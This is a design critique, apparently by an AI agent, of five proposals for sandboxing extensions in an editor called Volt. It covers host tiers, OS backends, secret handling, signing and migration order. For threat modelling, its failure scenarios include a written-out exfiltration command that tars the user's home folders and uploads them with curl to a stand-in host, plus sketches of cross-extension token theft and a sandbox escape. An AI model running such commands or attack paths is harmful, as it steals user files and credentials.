# Critique `claude-a` (round 2)

Author: `claude-a` (Opus 5.5). 2026-11-08. Lens: host tiers, the Volt extension API, and the 30-extension migration. The question I ask of each plan: does it ship, does any feature disappear, and does it put code into a tier that can't hold it?

All five proposals are present (`grok.md`, `claude-a.md`, `claude-b.md`, `sol.md`, `terra.md`). Code citations are **main** (this checkout) unless marked **(sbx)** = `feat/volt-sandbox` via `git show`. Proposal citations are `<file>.md §n` with line numbers in that file.

Facts I checked for this round:
- `mainThreadSecretState.ts:38-56` (main): `$getPassword(extensionId, key)` / `$setPassword(extensionId, key, value)` take the extension id **as an RPC argument from the extension host**. The main thread does not derive it from the channel. (This answers `claude-b` Q1: yes, it trusts the payload.)
- `extensionHostConnection.ts:277` (main): the server ext host is `cp.fork(bootstrap-fork)`. Confirmed.
- `sandboxPolicy.ts` `sandboxLaunchKey` (sbx): the key is `[level, network, extraWritableRoots]`. Its comment says allowed hosts are deliberately left out "the proxy takes those live".
- `05-limitations.md` item 8 (sbx): the agent profile "reads the whole filesystem except credentials", reaches system services, can read Keychain items the `security` tool reads, and has unfiltered network when network is on. `seatbelt.ts:112-115` (sbx) emits `(allow default)` when `systemServices` is set.
- `src/vs/platform/voltUsage/electron-main` and `src/vs/platform/voltAccounts/electron-main` exist on main: both features do their privileged work in Electron main today.
- `voltCustomizeService.ts` (main) registers configuration defaults (`deltaConfiguration`/`registerDefaultConfigurations`). `scratchBoard/scratchAgentDock.ts` (main) embeds a live chat in the board.
- `voltFeatureService.ts:48,55` (main): feature enablement is recomputed live on `onDidChangeExtensions`.

---

## 1. Objections

### O1. `terra` §3.3 / §7 / PR 13 / PR 17: "audit mode" for the OS policy cannot be built on two of three backends, and makes first-party hosts look sandboxed while they aren't

**Claim.** `terra.md:173`: policy v2 gets `audit: true`, "denials are logged but not blocked". `terra.md:359` and PR 13 (`:765-781`): first-party T1 hosts run under the compiled policy with `audit: true` "for the first two releases", then PR 17 flips to enforce once "zero first-party denials in beta for 7 days".

**Why it fails.**
- **bubblewrap has no audit mode.** A path is either bound into the mount namespace or it doesn't exist. To "log but allow" a read of `~/.aws/config`, you must bind it, and then there is no denial to log. The only way to audit on Linux is to bind the whole home (no sandbox) and trace with fanotify/seccomp-notify/strace. That is a second enforcement engine nobody has scoped.
- **MXC ProcessContainer** takes allow rules (ACLs, WFP IP/port rules; brief §4). Nothing in the brief or `grok` §4.1 suggests a report-only mode.
- **Seatbelt** can do `(with report)`, so macOS is the only backend where this works.
- So on Linux and Windows "audit" means "unsandboxed". Yet PR 13's acceptance has the Security page show these hosts. A user, or `terra`'s own release gate, sees `sandboxed` next to a process that has the full user's rights.
- The "zero denials" gate passes trivially on Linux: zero denials were *possible*.
- It also breaks the decided rule (brief §3 step 7, "refuse, never fall back"). An `audit` layer is a trusted widening to "everything", applied by a flag.

**Failure scenario.** Release N ships `volt.usage` as a T1 extension in an `audit` host on Ubuntu, holding raw OAuth tokens. It gets those through `terra` §10's `volt.secrets.get`, which returns values. A parsing bug in a provider usage response is exploited by a malicious usage endpoint, through DNS or a compromised CDN. The host writes `~/.bashrc` and connects anywhere. The Security page says "Sandboxed (audit)". Telemetry shows zero denials, so PR 17 flips to enforce with a manifest that was never exercised.

**Fix.** Audit belongs at the **RPC capability check** (`claude-b` §6.3 "report mode", my W0). There, "log but allow" is one `if`. The OS profile of a host is either enforced or the host is labelled `Not sandboxed` and is first-party-only. No `audit` field in the OS policy schema.

### O2. `terra` §2/§6.1/PR 13–14 and `grok` §2/§6/P7: first-party features and all 12 providers become unavailable wherever the OS backend refuses

**Claim.**
- `terra.md:83`: providers ×12, memory, playgrounds, commitReview, usage, automations, gitGraph, pullRequests and more all run in "First-party ext host on volt-server … OS sandbox **Yes**".
- `terra.md:236`: Windows 10 / older 11 is "Refuse + Run outside sandbox".
- `grok.md:84`: T1 is a "Sandboxed host on volt-server, or a T2 worker". `grok.md:399` refuses Windows 10 unless the elevated sandbox-user is installed. `grok.md:643` gives providers no `child_process`, only `volt.exec`, which is `SandboxManager.run`.

**Why it fails.** Neither plan says what happens to **first-party** code when `probe()` refuses. Under the decided rule (refuse, never fall back), the first-party host never starts. That host carries the providers, so Volt loses every agent. This happens on:
- every Windows 10 machine;
- every Windows 11 machine below 26100.9278;
- every Linux box where `bwrap` is missing or unprivileged user namespaces are restricted. On such a host `grok.md:118`/`sol.md:118` refuse, and `terra.md:201` already expects the `kernel.apparmor_restrict_unprivileged_userns` case.

Today that code runs in the renderer and works everywhere, so this is a **regression from "unsandboxed but working" to "missing"**, not a security improvement. `terra.md:336` makes it worse: "No shim period with two code paths". PR 12 deletes the `voltRuntime` tool code in the same PR, so there is no in-process build to fall back to.

**Failure scenario.** A user on Windows 11 23H2 (below the MXC floor) updates to the release that lands `terra` PR 14 or `grok` P7. The model picker is empty: no Claude, no Codex, no Cursor. The only control offered is "Run outside sandbox" per launch, for a host the user never knew existed. Memory, commit review and playgrounds are gone too.

**Fix (my revised rule, R-T2 below).** First-party code compiles to **two targets from one source**: the T2 host build and an in-process T1 build behind the facade. That was my W4 fallback (`claude-a.md:546`), and I now make it a hard requirement.
- If the OS backend is unavailable, first-party plugins run as T1, labelled `Not sandboxed (OS unsupported)`. That is exactly today's exposure, no worse.
- Third-party code never gets this fallback.
- Agent CLIs keep "refuse unless the user clicks Run outside sandbox", because they execute model-driven commands.

### O3. `terra` §6.3: "describe, don't spawn" still lets a provider choose the program, inside the widest profile Volt has

**Claim.** `terra.md:318-332`: a provider extension's `launch(ctx)` returns `IVoltAgentLaunchSpec { command, args, env, acp, policyHints }`, and core launches it with SandboxManager. The proposal concludes: "a malicious *provider* extension can lie about models but can't start an unsandboxed process."

**Why it fails.** It starts **any** process inside the **agent profile**. Per `05-limitations.md` item 8 (sbx), that profile reads the whole filesystem except credentials, runs under `(allow default)` (`seatbelt.ts:114`, sbx), reads Keychain items the `security` tool can read, and gets unfiltered network when the chat's network is on. "Sandboxed" here is the weakest sandbox in the system. `policyHints` are narrow-only, so they don't help: the attacker picks the command, not the policy.

**Failure scenario.** A third-party "Provider: FooLLM" (PR 14 opens provider registration to third parties, `terra.md:792`) returns `{command: '/bin/sh', args: ['-c', 'tar cz ~/work ~/Documents | curl -T - https://x.example']}`.
- The chat has network on (common for agents).
- The tarball goes out through the unfiltered network.
- The process is "sandboxed", and the user saw only a model picker entry.

A compromised update of a first-party provider does the same with Volt's signature on it.

**Fix.** The launch spec is **data in the signed manifest**, not a function result:
- `contributes.voltAgents[].command` is a bare binary name resolved by core on `PATH`/known install dirs. The resolved path is shown in the install sheet. `args` is a template with only core-defined substitutions (`${model}`, `${cwd}`, `${acpFlags}`).
- Third-party providers additionally get a per-provider profile, not the shared agent profile:
  - their manifest's API hosts only;
  - home read limited to their declared state dir.
- This is my W1 (`claude-a.md:543`) made strict. Model listing and auth probing are the only provider *code*, and they run in T2 with `process.exec:[<that binary>]`.

### O4. `terra` §2 "shared untrusted pool" and `grok` §3.5 "one host per trust label": co-hosting mutually untrusted extensions lets one read the other's secrets, and widens the OS policy to the union

**Claim.**
- `terra.md:85`: T3 is "one sandboxed ext host per publisher (cap 8, then shared 'untrusted pool')".
- `grok.md:336`: "One host per trust label in v1 (all T3 together is acceptable only while every one of them has the same restricted policy)".

**Why it fails.**
1. **Secrets.** `mainThreadSecretState.ts:38-56` keys SecretStorage by an `extensionId` that the **extension host sends**. Inside one Node process there is no boundary between extensions: same realm, same `require` cache, same RPC socket. Extension A can issue `$getPassword('ms-python.python', …)`, or simply wrap B's `context.secrets` before B activates, which needs no RPC at all.
2. **Policy union.** A host has one OS profile. `grok` admits this ("acceptable only while … the same restricted policy"). `terra`'s pool has no such rule. The moment the user grants `fs.write:workspace` or `net.connect:api.foo.com` to pool member #9, members #10–#30 get it too, without a prompt.

**Failure scenario.** The user has 12 publishers, so publishers 9–12 land in the pool. Publisher 11's extension is a GlassWorm-class (`claude-b` AT-1) copy of a theme. Publisher 9's extension is a GitHub client the user signed into; its PAT sits in SecretStorage under its id. Publisher 11 calls `$getPassword('pub9.github', 'token')` over the shared RPC, then sends the token to `raw.githubusercontent.com`, which pub 9 was granted and which therefore applies to the whole pool. Nothing is denied at either layer.

**Fix.**
- **One host per extension** for third parties (`sol` §2, adopted).
- **Per-publisher grouping only** when the extensions in the group have byte-identical grants. Any grant change splits the group.
- **No cross-publisher pool, ever.** Memory is handled by laziness (start on activation event, stop after idle; `claude-a.md:107`), not by co-hosting.
- `MainThreadSecretState` and every `MainThreadVolt*` must take the caller id from the **channel**, not the payload. For a host with one extension that is trivially true. Add an assert that rejects a mismatched `extensionId`.

### O5. `claude-b` §2: T2 as `worker_threads` "on volt-server/desktop utility", and "SES alone" where there's no OS backend, rebuilds DeepSeek's `run_code` hole

**Claim.** `claude-b.md:464`: T2 is a "dedicated worker per plugin (Node `worker_threads` on volt-server/desktop utility …) with SES lockdown". `claude-b.md:470`: "Where the OS backend is missing (Windows without MXC), T2 still runs with SES alone … it degrades to 'one layer' instead of 'none'."

**Why it fails.**
- A `worker_thread` shares the process's OS rights, file descriptors and environment. Brief §4 records DeepSeek's second hole as exactly this: "`run_code` ran in a worker thread outside the sandbox". `grok.md:98` says the same ("a thread shares the host's namespaces").
- If the parent is the desktop utility process or an unsandboxed volt-server, one SES escape is the user's full account.
- An SES escape is not hypothetical: it needs one missed intrinsic, a host object passed by reference, or a V8 bug.
- "Degrades to one layer" sounds safe, but for third-party code it is the same exposure as an unsandboxed VS Code extension, labelled as a sandbox.

**Failure scenario.** A user on Windows 11 23H2 installs a third-party T2 plugin. It runs as a worker inside volt-server, which on that machine holds:
- the agent-server HMAC secret;
- every chat's transcript;
- every provider token in memory.

The plugin uses a known SES bypass in the pinned `ses` version (there have been several, patched upstream). It reaches `process` from the worker, reads the HMAC secret with `require('fs')`, and drives every chat through the agent server's own `/ws`. No OS layer is consulted, because there isn't one.

**Fix.**
- T2 is a **separate process** with an empty OS profile; workers live inside it (`claude-a` §2.2, `terra` PR 21 agree).
- Without an OS backend, a **third-party** T2 plugin needs the same per-plugin "runs with your full access" acknowledgement as T3 (`claude-b`'s own T3 rule, `claude-b.md:537`), not a silent "language sandbox only" label.
- First-party T2 falls back to T1 (O2).

### O6. `claude-b` §6.1 and `sol` §2/§6: first-party features assigned to T2/T3 that cannot run there, so the migration deletes features

**Claim.**
- `claude-b.md:558-570` puts visuals, scratch-board, customize, usage, memory, skills, agent-resources, playgrounds, git-graph, commit-review, pull-requests, code-intelligence and automations all in **T2** (worker + SES, UI only through iframes).
- `sol.md:37`: "T1 Bundled first-party plugin — Same T2/T3 isolation as third party". `sol.md:189-210` then migrates all 18 features that way, including browser, devices and computer-use.

**Why it fails, feature by feature.** T2 has no DOM, no workbench services and only iframe/declarative UI. T3 has the VS Code API and webviews.

| Feature | What it does today | Why T2/T3 can't hold it |
|---|---|---|
| `customize` | Registers configuration defaults and restyles the workbench (`voltCustomizeService.ts`: `deltaConfiguration`); hosts the Playground + devtools | An iframe cannot change workbench configuration defaults or CSS tokens. `settings.write:window` (`claude-b.md:560`) is a new API whose effect is restyling the TCB's own UI. That is the clickjacking/spoofing surface customize §6.3 rejected. |
| `scratch-board` | 15k-line canvas whose **agent dock embeds a live chat** (`scratchAgentDock.ts`; team rule "never dispose" the dock) | A chat widget is core UI with the composer, queue and transcript. It can't be mounted inside a plugin iframe. `claude-b`'s `ui.panel` loses the dock. |
| `visuals` | 21k lines rendering chart/diagram cards **in the transcript hot path** plus the zoom viewer | One iframe per card is ~one renderer frame each. A 100-card transcript is unscrollable (`claude-a.md:164`). Agent HTML is already isolated in its own iframe; the card chrome must stay core. |
| `computer-use` (`sol` #11) | Native helper; TCC attributes Accessibility/Screen Recording to the responsible process (team memory: TCC per path) | A sandboxed T2/T3 host is not Volt.app to TCC, so the helper loses its grant or needs a second grant per host path. Both `terra.md:298` and `claude-b.md:574` concede it stays a native helper. `sol` doesn't. |
| `browser` (`sol` #9) | Electron `<webview>` + CDP in main (`platform/voltBrowser/electron-main`) | Webviews exist only in Electron main/renderer. A T2 worker can't own one. |
| `claude-accounts` (`sol` #16, "Claude credential handles only, never raw tokens") | Swaps `~/.claude` credential files under Claude's own locks (`platform/voltAccounts/electron-main`) | The feature **is** writing raw credentials into another harness's files. A handle-only API deletes it. It has to be a T1/core broker (`claude-a` #13, `claude-b` "P1-H or broker"). |
| `usage` (`claude-b` T2) | OAuth-token fetches with the claude-cli UA from Electron main (`platform/voltUsage/electron-main`) | Works in T2 **only** after a secrets broker with header injection exists (`claude-a` row 17: T1 now, T2 in W4). `claude-b`'s table has no ordering, so moving it early means raw tokens in a T2 worker. |

**Failure scenario.** Follow `sol` §12 PR 10, "Migrate features 1-9 … with dual-run parity". Visuals goes first. The parity test fails on the first diagram card, because transcript blocks can't render from an isolated host. The flag stays off, and the "migration" is a copy of 21k lines that never ships. Scratch-board (#2) hits the dock. The plan stalls at step 1 of 18.

**Fix.** Assign tiers per feature (my §6.3 table; `terra` §6.1 reaches nearly the same split with "T0p").
- Seven features are **in-process forever**: customize, browser, devices, computer-use, claude-accounts, remote-devices pairing and skills install.
- Visuals and scratch are in-process, with their **declarative block kinds promoted to core** so third parties can return charts and diagrams without iframes.

### O7. `sol` §6 #17–18: putting the installer and the feature switch inside plugins puts the TCB under the thing it administers

**Claim.**
- `sol.md:209`: `volt-skills-and-plugins` is a plugin owning "marketplace/install/signature/permission APIs".
- `sol.md:210`: `volt-customize` is a plugin, migrated last "because it gates the others".

**Why it fails.**
- **The feature switch.** `IVoltFeatureService` lives in `contrib/voltCustomize/browser/voltFeatureService.ts` and recomputes enablement live (`:48`, `:55`). If customize becomes a T2/T3 plugin, the code deciding which plugins run is itself a plugin. It can crash, be disabled, be revoked or be updated through the plugin channel.
- **The installer.** If skills-and-plugins holds the signature/permission API, a compromised update of that one plugin can install anything with any grant. Signing becomes circular: the verifier is verified by itself.

**Failure scenario.**
1. The revocation feed revokes `volt.customize` 1.4.2 for a bug (`sol` §7 supports revocation).
2. The plugin is disabled.
3. `IVoltFeatureService` disappears with it, so every feature defaults to on or to off, depending on which side of the RPC the default lives.
4. The user can't turn the broken feature off, because the toggle UI was in the revoked plugin.

The same applies if the customize host fails `confirm` on an unsupported OS (O2).

**Fix.**
- The feature catalog, enablement, the installer, signature verification and the grant store are **core** (`claude-a` §6.5, `claude-b` §6.2).
- Only the customize *pages* (Looks gallery, Playground UI) and the skills marketplace *browser* are plugin surfaces, and they call core brokers.

### O8. `grok` §6: the API surface is too small to migrate the features it orders, and the code-move recipe crashes on a live toggle

**Claim.** `grok.md:629-641` gives a "minimum surface" of nine APIs:
- `agents`, `workspace`, `scm`, `terminal` (observe and run), `exec`, `secrets`, `network`, `ui` panel.

`grok.md:682`: "the old module becomes a re-export that throws if both are on."

**Why it fails.**
- **Missing APIs.** There is no `tools.register`, yet memory, playgrounds, commit-review, scratch (`scratch_read/draw`), visuals (`render_chart`), browser, computer-use and code-intelligence all *are* host tools. There is also:
  - no `storage` (memory);
  - no `context.contribute` (the memory index injected into the prompt);
  - no model-provider registration (local, openrouter);
  - no `chats.create` (scratch dock, automations);
  - no automation triggers;
  - no declarative blocks, dock sections, slot items or settings pages. The only UI is "`ui` panel iframe".
- So `grok`'s own order (#16 automations, #18 memory, #21 customize) has nothing to build on.
- **Wrong row.** `volt.terminal observe` is listed for agent-resources. Agent-resources reads harness files (`contrib/voltAgent/browser/resources/**`) and never observes terminals.
- **The throw.** Enablement flips live on `onDidChangeExtensions` (`voltFeatureService.ts:55`). During the recompute window both paths are momentarily on. A module that throws in that state turns a user's toggle click into an exception in the contribution loader.

**Failure scenario.** `grok` P8 starts on `volt.memory`. There is no way to register `memory_write`/`memory_read` as host tools, and none to put the memory index in the prompt. The feature can't be expressed, so the PR either adds private imports (defeating the boundary) or stalls.

**Fix.**
- Adopt the namespace set in `claude-a.md` §6.2: tools, agents, chats, queue, context, ui (declarative + panels), files, git, hosting, terminals, process, net, secrets, storage, config, browser, devices, automations, usage, hooks, commands. `terra` PR 10's v0 is a good first subset.
- Replace "re-export that throws" with "the contribution's `activate` is idempotent and the facade refuses a second registration of the same tool id with a logged error".

### O9. `grok` §6 step 2 / P3: putting the existing server extension host under a T1 policy gives third-party extensions first-party grants and a "sandboxed" label

**Claim.** `grok.md:625`: "Point the server extension host at `SandboxManager.start` with a T1 policy (P3)."

**Why it fails.** Today the server's one ext host (`extensionHostConnection.ts:277`) runs **every** remote extension for web and phone clients, third-party ones included. A T1 policy is the wide first-party one (`grok.md:84`: "Signed manifest, pre-granted"). Until P9 splits hosts, Open VSX extensions in that host run with the union of first-party grants, and Settings shows `sandboxed`. That is worse than today's honest "not sandboxed", because the label invites trust.

**Failure scenario.** A web `/code/` user installs a third-party extension. It lands in the P3 host, which has T1's `fs.write:workspace` (unmasked), `net` to every first-party API host, and the `secrets` broker for `claude-accounts`. The extension writes `.vscode/tasks.json`. `protectNew` is partial on Linux (`grok` E14, which `grok` mitigates only from P5 onward). The extension also POSTs to `api.github.com`, a first-party host that is exfil-capable (`claude-b` §8.6).

**Fix.** The first sandboxed server host is the **third-party** host with `exthost-default` (`claude-a` §9.1 / `terra` §9.1). First-party code doesn't go into an extension host at all until it is a T2 plugin (O2, O6).

### O10. `claude-b` §3.5: "launch key includes every grant" undoes the live-grant fix and restarts agents mid-turn

**Claim.** `claude-b.md:530`: "**Launch key includes every grant** so a process is never reused across different grants (F-07's rule, extended)". The same section (`:527`) says network grants are live through the proxy.

**Why it fails.** The two rules contradict each other. If allowed hosts are in `sandboxLaunchKey`, an "Allow host" click changes the key, and the next send sees a different key and spawns a new agent process. The sbx code deliberately excludes them (its comment: "allowed hosts are not in it, the proxy takes those live"). `grok` §3.6 and `terra` PR 2 both keep that exclusion.

**Failure scenario.** A Claude Code turn is blocked on `registry.npmjs.org`. The user clicks Allow. `claude-b`'s rule restarts `claude` with a new launch key. The ACP session is torn down, the in-flight tool call is lost, and the retried turn starts a new process with a cold cache. This repeats on every new host. That is the prompt-fatigue failure `claude-b` §8.6 itself warns about, now with a lost turn attached.

**Fix.**
- The launch key covers **relaunch-class** state only: OS profile, writable roots, policy hash.
- Network grants are proxy state keyed by principal, updated with compare-and-swap on a revision (`sol` §3).
- F-07's concern (reuse across different grants) is met by keying the **proxy principal**, not the process.

---

## 2. What I concede and adopt

| From | What I adopt | Replaces in my proposal |
|---|---|---|
| `claude-b` §7.3 | **Ceiling table compiled into the core binary** (`pluginId → max capabilities`, CODEOWNERS). A first-party update asking for more than the ceiling has the excess **dropped** (fail-safe, not fail-open), and widening needs a core release. | My "manifest diff shown to the user + CODEOWNERS on the manifest". A feed-delivered first-party update could still widen its own manifest; the ceiling closes that. |
| `claude-b` §8.4, AT-2 | Grants keyed by signer fingerprint; **signer change drops all grants**. | Partly had (TOFU); now explicit for grants. |
| `claude-b` §3.1 | **Caller attenuation**: a plugin acting for a chat gets `result ⊆ caller policy`. | My §2.4 checked only the plugin's grants, which lets `automations` run a node with more than the chat had. |
| `claude-b` §7.2 / PR 1, 4 | TUF-signed feed and release secrets behind a protected Environment, **before** the marketplace. | I treated update signing as one line. |
| `sol` §2, §3 | **Principal minted by the manager** (random workload id; identity = route, never a header). **Grant CAS on `policyRevision`.** **The execution host is the only grant authority**; web and phone propose. | My channel-bound identity covered plugins only; `sol` extends it to network, MCP and remote. |
| `sol` §2 | **One T3 host per extension** for third parties. | My T3 had no grouping rule (see O4). Per-publisher grouping stays only for identical grants. |
| `sol` §5 | `mcp-http:<digest>` and `package-fetch:<lockDigest>` network identities; no `npx -y` outside containment. | Missing in mine. |
| `grok` §3.2, E12 | Untrusted `env.set` must drop secret names (`sandboxComposition.ts:226-229` sbx only checks reserved/injection); a launcher **reserve list** written last. | My §3 named the env problem but missed the untrusted `env.set` hole. |
| `grok` §3.4, §10 | `filesystem.brokerWrites` as an enforced dimension; untrusted writers use broker fds, not raw binds. Consumer-side hook guard (E14). | Mine relied on `protectNew` being partial. |
| `grok` §4.1 | The Windows chooser: MXC for PE images, sandbox-user only for msys/cygwin or "MXC unsupported", `wsl` refused, **no fallback from a broken MXC trial**. | Mine deferred to `grok`. |
| `terra` §0.1, PR 1–6 | **Reorder**: harden and merge the agent sandbox (≈11 ew) before and alongside migration. | My W0 (facade) never needed the sandbox, so both run in parallel. W4 (T2) still waits for `start()`. |
| `terra` PR 6 | **Spawn-audit CI gate**: every `child_process`/`utilityProcess`/`Worker`/`vm` call site is allowlisted with a reason. | New. It is the mechanical guard against O5's class. |
| `terra` §12 | **Kill switch only moves `enforce → ask`, never silently `off`.** Confirm **canary** from inside long-lived hosts. | New. |
| `terra` §6.1 "T0p", D5 | Fence-only + lazy `import()` for the deep-UI features; disabling really unloads code. | Same as my T1 + facade + lint; I adopt lazy loading as part of W2's definition of done. |
| `terra` §6.3 | Providers are **describe-only**; core does the spawn. | Kept, with O3's fix (binary and args template are signed data, not function output). |
| `terra` PR 19, D2 | Desktop third-party extensions route to the **local volt-server's** sandboxed hosts, not a second fork path in Electron main. | Mine said "children of the shared process [guess]". I drop that guess. |

---

## 3. Revised position on every disputed decision

| # | Decision | Positions in round 1 | My revised position | Why it changed or held |
|---|---|---|---|---|
| D1 | **Windows backend** | `grok`: MXC primary, sandbox-user explicit for msys/old builds. `sol`: MXC, srt-win experimental only. `terra`: MXC; srt-win only if Win10 demand (PR 25). `claude-b`: MXC else refuse T3/T4. | **MXC ProcessContainer via pinned, Authenticode-checked `wxc-exec` on supported Win11 builds. Refuse otherwise.** The sandbox-user backend is built later (`terra` PR 25 timing), with `grok`'s chooser rules and never as a fallback for a broken MXC trial. **First-party code on unsupported Windows runs as T1, labelled `Not sandboxed (OS unsupported)`** (O2). Third-party T2/T3 there needs a per-plugin full-access acknowledgement (O5). Agent CLIs refuse unless the user clicks "Run outside sandbox". | Held MXC-primary. Added the first-party T1 fallback because without it Windows 10 loses every provider. |
| D2 | **First-party "allow all"** | All five reject it. Variants: manifest + CODEOWNERS (me), ceiling in core (`claude-b`), pre-approved + audit→enforce (`terra`), catalogue of silent grants (`sol`), pre-granted signed manifest (`grok`). | **Signed ceilings compiled into core** (`claude-b`): built-ins are trusted by app signature + `builtin-manifest.json` hashes; out-of-band first-party updates through TUF; requests above the ceiling are dropped. **Audit/report mode at the RPC check only, never in the OS policy** (O1). Zero prompts for first-party. | Adopted `claude-b`'s ceiling over my manifest diff. Rejected `terra`'s OS audit as unimplementable on bwrap/MXC. |
| D3 | **Host tiers** | `grok`: T1 = sandboxed host; computer-use + terminal T0. `sol`: first-party = same isolation as third party. `terra`: T0p in-process + T1 out-of-process ext host + T2 SES host + T3 per publisher with pool. `claude-b`: P1 in T2/T3 + P1-H helpers; T2 = worker_threads. Me: T0 / T1 in-process + facade / T2 process-per-publisher + SES workers / T3 sandboxed ext host / T4 VM. | **T0** core TCB. **T1** first-party in-process behind facade + import lint + lazy load (built-ins only, never downloadable). **P1-H** native helpers for computer-use, devices, speech, tunnels, code index, each with its own OS profile + authenticated RPC (`claude-b`). **T2** = a separate OS-sandboxed process (empty profile), SES workers inside, grouped by publisher only with identical grants; **every first-party T2 plugin also has a T1 build**. **T3** = one sandboxed `bootstrap-fork` host **per extension** on volt-server (desktop routes there); web-worker host for `browser` entries; **no cross-publisher pool**. **T4** opt-in microVM. Electron main runs no plugin code. Caller ids come from the channel, never the payload (fixes `mainThreadSecretState.ts:38`). | Moved T3 from unspecified to per-extension (O4). Made the T1 fallback mandatory (O2). Took P1-H from `claude-b`. Rejected worker-only T2 (O5). |
| D4 | **Migration order** | `grok`: sandbox core + server host first, then providers → features. `sol`: visuals first → customize last, then providers. `terra`: harden agent sandbox (PR 1–9) ∥ API + fence, then waves A–D, then third-party. `claude-b`: release/listener hardening first, then platform. Me: W0 facade → W1 providers (data) → W2/W3 T1 → W4 T2 → W5 third-party. | **Two parallel tracks from day one.** **Track S** (`terra` PR 1–6 + `claude-b` PR 1, 2, 4): merge and harden the sandbox, live Allow-host, policy files, spawn audit, release secrets, listener auth, signed feed. **Track M**: W0 facade + manifest-generated catalog in RPC report mode → W1 providers as **signed data** (O3) → W2 self-contained features to T1 enforce → W3 entangled features (PR/commit-review split, browser broker before playgrounds/visuals). **Join** at W4 (needs `start()` + the T2 host): memory first, then provider hooks, local/openrouter, agent-resources, usage (after the secrets broker). **W5** opens third-party with per-extension T3. Nothing first-party enters an extension host before W4 (O9). | Adopted `terra`'s parallel hardening. Rejected `sol`'s visuals-first (O6) and `grok`'s T1-policy server host (O9). |
| D5 | **Volt API surface** | `grok`: 9 APIs. `sol`: per-feature broker list + one `volt.agentProvider`. `terra`: v0 = tools, agents, threads, storage, secrets, providers, voltPanels. `claude-b`: capability vocabulary only. Me: 21 namespaces. | **My 21 namespaces, shipped in `terra`'s v0 subset order** (tools, agents/chats, storage, secrets-as-refs, providers, ui declarative + panels), then context, git, hosting, files, terminals, net, browser, devices, automations, usage, hooks. Rules: **secrets are refs with broker-side header injection**; raw `secrets.read` is critical-class only. **Providers declare command + args template as signed data** (O3). **Declarative UI first** (lists, cards, blocks, chips rendered by core with `WorkbenchList`/Volt buttons); iframes only for rich panels; no `connect-src`. **Tool schemas come from the manifest**, so the tool list is complete before lazy activation. | Held. Tightened secrets (against `terra`'s `secrets.get` returning values) and providers (O3). |
| D6 | **Network broker** | `sol`: per-principal route, SOCKS5 + UDP ASSOCIATE later, CAS grants, local/loopback split. `grok`: proxy per host + `Proxy-Authorization`, `public` mode, no UDP. `terra`: proxy per principal, SNI==CONNECT check. `claude-b`: per-subject token, exfil-host list. | **`sol`'s identity model** (route-selected principal, CAS on revision, execution host authoritative) **+ `grok`'s per-host proxy with a per-host `Proxy-Authorization` secret + `terra`'s SNI==CONNECT check + `claude-b`'s exfil-capable host list** on the grant sheet. T2 plugins reach the network only through `volt.net` RPC (no socket at all). Launch key excludes network grants (O10). UDP, SOCKS5 and enterprise TLS inspection come later, behind versions. | Converged; no disagreement left except O10. |
| D7 | **Signing** | `claude-b`: TUF, 2-of-3 offline root, threshold-2 first-party with an independent rebuilder, revoke-only key. `terra`: Ed25519 via OIDC→KMS, offline root, `product.json` checksums. `grok`: release key, pin in app, "do not invent an HSM". `sol`: offline root → catalogue. Me: app signature + `builtin-manifest.json`, separate plugin key, TOFU third-party. | **Built-ins: app signature + `builtin-manifest.json` hashes checked at load** (mine). **Out-of-band first-party and the core feed: TUF** with `claude-b`'s roles (revoke-only key; nightly root ≠ stable root). **Threshold-2 rebuilder only when first-party plugins actually ship outside app releases** (until then, it guards nothing). Third-party: Open VSX signature where present + publisher pinning; signer change drops grants. Dev mode: unsigned plugins load **as third-party**, never T1 or `voltModule`, persistent badge; the switch lives in user data, not `settings.json`. Playground drafts with code install as `local.*`, third-party tier. | Adopted TUF and the revoke-only key. Deferred the rebuilder, because no out-of-band first-party channel exists yet. |

---

## 4. Notes for the synthesis

- **The single most important rule my lens found** is O2. Every plan that moves first-party code out of process must say what happens when the OS probe refuses. "Refuse, never fall back" is right for agents and third parties. For first-party code that runs unsandboxed today, refusing deletes features. The synthesis should state the T1-fallback rule explicitly.
- **`mainThreadSecretState.ts:38`** trusting the payload's `extensionId` is a fact, not a guess. It decides the shared-host question (O4) by itself.
- **Effort sanity:** `terra`'s wave C (≈14 ew of webview rewrites) disappears under declarative UI + T1. I'd expect migration to cost about half of `terra`'s ≈33 ew. That is a **guess**, but the direction is clear because only five first-party features ever leave the process.
